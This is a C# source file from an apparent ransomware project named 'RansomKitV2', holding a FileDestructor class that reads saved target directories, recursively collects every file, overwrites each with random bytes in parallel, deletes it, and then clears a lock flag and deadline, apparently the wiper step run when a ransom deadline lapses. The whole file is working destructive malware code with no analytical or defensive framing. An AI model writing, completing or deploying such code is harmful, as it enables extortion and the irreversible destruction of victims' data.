using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using System.Threading.Tasks;

namespace RansomKitV2
{
    public static class FileDestructor
    {
        private const int BufferSize = 64 * 1024;

        public static void Execute()
        {
            var paths = Persistence.LoadPaths();
            if (paths == null || paths.Count == 0)
            {
                Persistence.SetLocked(false);
                Persistence.ClearDeadline();
                return;
            }

            var files = new List<string>();
            foreach (var dir in paths)
            {
                if (string.IsNullOrWhiteSpace(dir) || !Directory.Exists(dir)) continue;
                try
                {
                    files.AddRange(Directory.EnumerateFiles(dir, "*", SearchOption.AllDirectories));
                }
                catch { }
            }

            using var gate = new SemaphoreSlim(Math.Max(2, Environment.ProcessorCount));
            var tasks = new List<Task>(files.Count);

            foreach (var file in files)
            {
                tasks.Add(Task.Run(async () =>
                {
                    await gate.WaitAsync().ConfigureAwait(false);
                    try { Shred(file); }
                    catch { }
                    finally { gate.Release(); }
                }));
            }

            try { Task.WaitAll(tasks.ToArray(), TimeSpan.FromSeconds(15)); }
            catch { }

            Persistence.SetLocked(false);
            Persistence.ClearDeadline();
        }

        private static void Shred(string path)
        {
            var info = new FileInfo(path);
            if (!info.Exists) return;

            if (info.Length == 0)
            {
                info.Delete();
                return;
            }

            try { info.Attributes = FileAttributes.Normal; } catch { }

            using (var fs = new FileStream(path, FileMode.Open, FileAccess.Write, FileShare.None))
            {
                long len = fs.Length;
                var buffer = new byte[BufferSize];
                long written = 0;
                while (written < len)
                {
                    int chunk = (int)Math.Min(BufferSize, len - written);
                    RandomNumberGenerator.Fill(buffer.AsSpan(0, chunk));
                    fs.Write(buffer, 0, chunk);
                    written += chunk;
                }
                fs.Flush(true);
            }

            File.Delete(path);
        }
    }
}